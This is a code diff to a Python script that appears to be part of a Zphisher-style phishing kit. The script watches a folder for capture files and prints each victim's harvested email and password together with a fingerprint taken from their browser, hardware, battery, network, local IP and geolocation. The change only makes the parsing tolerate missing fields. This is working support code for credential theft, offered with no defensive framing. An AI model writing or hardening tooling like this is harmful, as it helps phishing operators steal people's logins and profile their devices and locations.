@@ -11,6 +11,8 @@ RED = '\033[91m'
 RESET = '\033[0m'
 
 def safe_get(d, key, default='N/A'):
+    if d is None:
+        return default
     val = d.get(key, default)
     return str(val) if val is not None else default
 
@@ -19,7 +21,6 @@ def format_bool(b):
 
 def display_zphisher_style(entry, filename):
     """Print the full credential dump with all possible data"""
-    # If entry is list (old file), take last item
     if isinstance(entry, list):
         if not entry:
             return
@@ -29,46 +30,46 @@ def display_zphisher_style(entry, filename):
     form_data = entry.get('form_data', {})
     browser_info = entry.get('browser_info', {})
     server_info = entry.get('server_info', {})
-    server_geo = entry.get('server_geo', {})
+    server_geo = entry.get('server_geo', None)  # may be None
     timestamp = entry.get('timestamp', 'N/A')
     session_id = entry.get('session_id', 'N/A')
     site = entry.get('site', 'N/A')
 
     # Credentials
-    email = form_data.get('email') or form_data.get('username') or form_data.get('user') or 'N/A'
-    password = form_data.get('pass') or form_data.get('password') or form_data.get('passwd') or 'N/A'
+    email = safe_get(form_data, 'email') or safe_get(form_data, 'username') or safe_get(form_data, 'user') or 'N/A'
+    password = safe_get(form_data, 'pass') or safe_get(form_data, 'password') or safe_get(form_data, 'passwd') or 'N/A'
 
     # Client-side browser info
-    ua = browser_info.get('userAgent', 'N/A')
-    lang = browser_info.get('language', 'N/A')
-    platform = browser_info.get('platform', 'N/A')
-    timezone = browser_info.get('timezone', 'N/A')
-    cookies = browser_info.get('cookiesEnabled', False)
+    ua = safe_get(browser_info, 'userAgent', 'N/A')
+    lang = safe_get(browser_info, 'language', 'N/A')
+    platform = safe_get(browser_info, 'platform', 'N/A')
+    timezone = safe_get(browser_info, 'timezone', 'N/A')
+    cookies = safe_get(browser_info, 'cookiesEnabled', False)
     screen = browser_info.get('screen', {})
-    screen_res = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
-    color_depth = screen.get('colorDepth', '?')
+    screen_res = f"{safe_get(screen, 'width', '?')}x{safe_get(screen, 'height', '?')}"
+    color_depth = safe_get(screen, 'colorDepth', '?')
     hw = browser_info.get('hardware', {})
-    mem = hw.get('deviceMemory', '?')
-    cores = hw.get('cpuCores', '?')
-    touch = hw.get('touchSupport', False)
+    mem = safe_get(hw, 'deviceMemory', '?')
+    cores = safe_get(hw, 'cpuCores', '?')
+    touch = safe_get(hw, 'touchSupport', False)
     net = browser_info.get('network', {})
-    net_type = net.get('type', '?')
-    net_eff = net.get('effectiveType', '?')
-    net_down = net.get('downlink', '?')
-    net_rtt = net.get('rtt', '?')
+    net_type = safe_get(net, 'type', '?')
+    net_eff = safe_get(net, 'effectiveType', '?')
+    net_down = safe_get(net, 'downlink', '?')
+    net_rtt = safe_get(net, 'rtt', '?')
     battery = browser_info.get('battery', {})
-    batt_level = battery.get('level', '?')
-    batt_charge = battery.get('charging', False)
-    local_ip = browser_info.get('localIP', 'N/A')
+    batt_level = safe_get(battery, 'level', '?')
+    batt_charge = safe_get(battery, 'charging', False)
+    local_ip = safe_get(browser_info, 'localIP', 'N/A')
 
     # Server side
-    ip = server_info.get('ip', 'N/A')
-    geo = server_geo
-    country = geo.get('country', 'N/A')
-    city = geo.get('city', 'N/A')
-    region = geo.get('region', 'N/A')
-    isp = geo.get('isp', 'N/A')
-    org = geo.get('org', 'N/A')
+    ip = safe_get(server_info, 'ip', 'N/A')
+    geo = server_geo if isinstance(server_geo, dict) else {}
+    country = safe_get(geo, 'country', 'N/A')
+    city = safe_get(geo, 'city', 'N/A')
+    region = safe_get(geo, 'region', 'N/A')
+    isp = safe_get(geo, 'isp', 'N/A')
+    org = safe_get(geo, 'org', 'N/A')
 
     # ----- Print -----
     print(f"\n{BOLD}{GREEN}[+] NEW CREDENTIAL CAPTURED!{RESET}")
@@ -111,7 +112,6 @@ def monitor_credentials(site_name):
             current_files = set()
             if os.path.exists(site_dir):
                 for f in os.listdir(site_dir):
-                    # Exclude index and tracking files
                     if f.endswith('.json') and not ('index' in f or 'tracking' in f):
                         current_files.add(f)
             
@@ -127,7 +127,6 @@ def monitor_credentials(site_name):
                     processed_files.add(filename)
                     
                 except (json.JSONDecodeError, OSError):
-                    # File still writing
                     pass
             
             time.sleep(1)
